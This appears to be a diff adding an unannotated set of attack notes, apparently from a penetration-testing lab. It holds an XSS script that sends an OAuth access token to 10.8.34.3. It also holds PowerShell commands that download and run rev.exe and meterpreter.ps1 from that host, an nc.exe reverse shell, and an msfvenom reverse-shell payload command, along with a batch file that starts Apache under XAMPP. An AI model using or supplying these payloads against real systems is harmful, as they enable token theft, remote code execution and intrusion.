@@ -1,0 +1,28 @@
+<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];
+    return res;
+  }, {});
+  var accessToken = result.access_token;
+    var img = new Image();
+    img.src = 'http://10.8.34.3:8081/steal_token?token=' + accessToken;
+</script>
+
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.8.34.3:8000/rev.exe', 'C:\xampp\htdocs\uploads\rev.exe')" 
+
+C:\Windows\Temp\nc.exe -e cmd.exe 10.8.34.3 9876 
+
+
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.8.34.3:8000/meterpreter.ps1')"
+
+
+C:\xampp\htdocs\uploads\
+
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.34.3 LPORT=4545  -f psh-cmd > reverse_shell.ps1
+
+
+@echo off
+cd C:\xampp
+apache\bin\httpd.exe
+
+
+
